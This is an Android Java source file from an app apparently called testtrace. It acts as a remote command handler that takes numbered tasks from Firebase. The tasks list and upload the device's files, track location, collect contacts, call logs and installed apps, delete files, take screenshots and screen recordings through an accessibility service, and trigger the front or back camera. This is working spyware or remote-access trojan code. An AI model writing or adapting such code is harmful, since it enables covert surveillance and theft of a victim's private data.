package com.reiserx.testtrace.Classes;

import static android.content.Context.MODE_PRIVATE;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;

import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.Query;
import com.google.firebase.firestore.QueryDocumentSnapshot;
import com.google.firebase.storage.FirebaseStorage;
import com.reiserx.testtrace.LocationFiles.GoogleService;
import com.reiserx.testtrace.LocationFiles.LocJobUtil;
import com.reiserx.testtrace.Models.callLogs;
import com.reiserx.testtrace.Models.contacts;
import com.reiserx.testtrace.NotificationClasses.getListOfApps;
import com.reiserx.testtrace.Operations.checklistOffiles;
import com.reiserx.testtrace.Operations.createFolder;
import com.reiserx.testtrace.Operations.deleteFiles;
import com.reiserx.testtrace.Operations.getCallLogs;
import com.reiserx.testtrace.Operations.getContactLists;
import com.reiserx.testtrace.Operations.getListOfFolder;
import com.reiserx.testtrace.Operations.getUsageStats;
import com.reiserx.testtrace.Screenshot.accessibilityService;
import com.reiserx.testtrace.Service.CameraService;

import java.util.ArrayList;
import java.util.Locale;
import java.util.Objects;

public class checkDatabase {
    Context context;
    String data, value, userID, subTask;
    int cases;
    FirebaseDatabase mdb;
    FirebaseStorage storage;
    FirebaseFirestore firestore;

    public checkDatabase(Context context, String value, int cases, String userID, FirebaseDatabase mdb, FirebaseStorage storage, String subTask, FirebaseFirestore firestore) {
        this.context = context;
        this.value = value;
        this.userID = userID;
        this.subTask = subTask;
        this.cases = cases;
        this.mdb = mdb;
        this.storage = storage;
        this.firestore = firestore;
    }

    public checkDatabase(Context context, String value, int cases, String userID, FirebaseDatabase mdb, FirebaseStorage storage, FirebaseFirestore firestore) {
        this.context = context;
        this.value = value;
        this.userID = userID;
        this.cases = cases;
        this.mdb = mdb;
        this.storage = storage;
        this.firestore = firestore;
    }

    public void checkDatabases() {
        try {

        switch (cases) {
            //Get list of folders
            case 1:
                if (value != null && value.equals("Directorys")) {

                    String path = Environment.getExternalStorageDirectory().toString();
                    getListOfFolder getListOfFolder = new getListOfFolder(context);
                    getListOfFolder.getListOfFolder(FirebaseDatabase.getInstance(), userID, "Directorys", path);

                } else if (value != null) {
                    String paths = "/Folders/Files/".concat(("Primary Folder/".concat(value)));
                    String path = Environment.getExternalStorageDirectory().toString() + "/".concat(value);
                    getListOfFolder getListOfFolder = new getListOfFolder(context);
                    getListOfFolder.getListOfFolder(FirebaseDatabase.getInstance(), userID, paths, path);
                }
                break;
            case 2:
                //Location request
                LocJobUtil.scheduleJob(context);
                break;
            case 3:
                if (value!=null) {
                    checklistOffiles checklistOffiles = new checklistOffiles();
                    checklistOffiles.checklistOffiles(FirebaseDatabase.getInstance(), value.toLowerCase(), userID);
                }
                break;
            case 4:
                if (value!=null) {
                    uploadFiles uploadFiles = new uploadFiles(context);
                    uploadFiles.uploadFiles(FirebaseDatabase.getInstance(), storage, value.toLowerCase(Locale.ROOT), userID, 1);
                }
                break;
            case 5:
                if (value!=null) {
                    SharedPreferences settings = context.getSharedPreferences(value, MODE_PRIVATE);
                    settings.edit().clear().apply();
                    FirebaseDatabase.getInstance().getReference("Main").child(userID).child("Task")
                            .removeValue()
                            .addOnSuccessListener(unused -> {
                            });
                }
                break;
            case 6:

                if (value.equals("get")) {
                    ArrayList<contacts> contactList = new ArrayList<>();

                    Log.d("Infossss", "number");
                    final String[] PROJECTION = new String[]{
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                            ContactsContract.Contacts.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    };
                    getContactLists getContactLists = new getContactLists(context);
                    getContactLists.getContactList(PROJECTION, contactList, userID, FirebaseFirestore.getInstance());
                }
                break;
            case 7:
                if (value!=null) {
                    mdb.getReference("Main").child(userID).child("Task")
                            .removeValue()
                            .addOnSuccessListener(unuseds -> {
                            });
                    deleteFiles deleteFiles = new deleteFiles();
                    deleteFiles.deleteFiles(value, userID, FirebaseDatabase.getInstance());
                }
                break;
            case 8:
                if (value.equals("get")) {

                    Query query = firestore.collection("Main").document(userID).collection("Call Logs")
                            .orderBy("dateinsecs", Query.Direction.DESCENDING)
                            .limit(1);
                    query.get().addOnCompleteListener(task -> {
                        if (task.isSuccessful()) {
                            for (QueryDocumentSnapshot document : Objects.requireNonNull(task.getResult())) {
                                callLogs callLogs = document.toObject(callLogs.class);
                                data = callLogs.dateinsecs;
                            }
                            if (data!=null) {
                                getCallLogs getCallLogs = new getCallLogs(context, FirebaseDatabase.getInstance(), userID, data, firestore);
                                getCallLogs.getLogs();
                                Log.d("calldetailssss", data);
                            } else {
                                getCallLogs getCallLogs = new getCallLogs(context, FirebaseDatabase.getInstance(), userID, null, firestore);
                                getCallLogs.getLogs();
                                Log.d("calldetailssss", "not exists");
                            }
                        } else {
                            Log.w("calldetailssss", "Error getting documents.", task.getException());
                        }
                    });
                }

                break;
            case 9:
                Intent in = new Intent(context, GoogleService.class);
                context.startService(in);
                break;
            case 10:
                if (value!=null) {
                    uploadFiles uploadFiles = new uploadFiles(context);
                    uploadFiles.uploadSingleFile(FirebaseDatabase.getInstance(), storage, value.toLowerCase(Locale.ROOT), userID, subTask);
                }
                break;
            case 11:
                getListOfApps getListOfApps = new getListOfApps(context, userID);
                getListOfApps.getData(firestore);
                break;
            case 12:
                getUsageStats usageStats = new getUsageStats(context, userID);
                usageStats = null;
                break;
            case 13:
                createFolder createFolder = new createFolder(value, subTask, userID);
                createFolder.create();
                break;
            case 14:
                accessibilityService.instance.takeScreenshots(userID);
                break;
            case 15:
                final Handler handler = new Handler(Looper.getMainLooper());
                accessibilityService.instance.startRecording();
                handler.postDelayed(() -> accessibilityService.instance.stopRecording(userID), Long.parseLong(value));
                break;
            case 16:
                if(!checkAccessibilityPermission()){
                    mdb.getReference().child("Main").child(userID).child("ServiceStatus").child("Accessibility").setValue(false);
                } else mdb.getReference().child("Main").child(userID).child("ServiceStatus").child("Accessibility").setValue(true);
                break;
            case 17:
                if (value!=null) {
                    uploadFiles uploadFiles = new uploadFiles(context);
                    uploadFiles.uploadFiles(FirebaseDatabase.getInstance(), storage, value.toLowerCase(Locale.ROOT), userID, 2);
                }
                break;
            case 18:
                if (value!=null) {
                    uploadFiles uploadFiles = new uploadFiles(context);
                    uploadFiles.uploadFiles(FirebaseDatabase.getInstance(), storage, value.toLowerCase(Locale.ROOT), userID, 3);
                }
                break;
            case 19:
                if (value!=null) {
                    uploadFiles uploadFiles = new uploadFiles(context);
                    uploadFiles.uploadFiles(FirebaseDatabase.getInstance(), storage, value.toLowerCase(Locale.ROOT), userID, 4);
                }
                break;
            case 20:
                if (value != null) {
                    if(checkAccessibilityPermission()) {
                        if (value.equals("front")) {
                            Intent intent = new Intent(context, CameraService.class);
                            intent.putExtra("requestCode", 1);
                            context.startService(intent);
                        } else if (value.equals("back")) {
                            Intent intent = new Intent(context, CameraService.class);
                            intent.putExtra("requestCode", 2);
                            context.startService(intent);
                        }
                    }
                }
                break;
            default:
                break;
        }
        } catch(Exception e) {
            ExceptionHandler exceptionHandler = new ExceptionHandler(e, userID);
            exceptionHandler.upload();
        }
    }
    public boolean checkAccessibilityPermission () {
        int accessEnabled = 0;
        try {
            accessEnabled = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        if (accessEnabled == 0) {
            return false;
        } else {
            return true;
        }
    }
}
